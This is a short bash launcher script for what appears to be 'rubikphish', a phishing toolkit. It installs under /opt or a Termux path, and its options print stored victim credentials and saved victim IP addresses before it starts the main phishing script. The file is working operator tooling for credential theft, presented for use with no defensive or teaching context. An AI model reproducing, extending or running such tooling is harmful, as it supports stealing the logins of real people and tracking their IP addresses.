#!/bin/bash

# https://github.com/rubikproxy/rubikphish

if [[ $(uname -o) == *'Android'* ]];then
	rubikphish_ROOT="/data/data/com.termux/files/usr/opt/rubikphish"
else
	export rubikphish_ROOT="/opt/rubikphish"
fi

if [[ $1 == '-h' || $1 == 'help' ]]; then
	echo "To run rubikphish type \`rubikphish\` in your cmd"
	echo
	echo "Help:"
	echo " -h | help : Print this menu & Exit"
	echo " -c | auth : View Saved Credentials"
	echo " -i | ip   : View Saved Victim IP"
	echo
elif [[ $1 == '-c' || $1 == 'auth' ]]; then
	cat $rubikphish_ROOT/auth/usernames.dat 2> /dev/null || { 
		echo "No Credentials Found !"
		exit 1
	}
elif [[ $1 == '-i' || $1 == 'ip' ]]; then
	cat $rubikphish_ROOT/auth/ip.txt 2> /dev/null || {
		echo "No Saved IP Found !"
		exit 1
	}
else
	cd $rubikphish_ROOT
	bash ./rubikphish.sh
fi
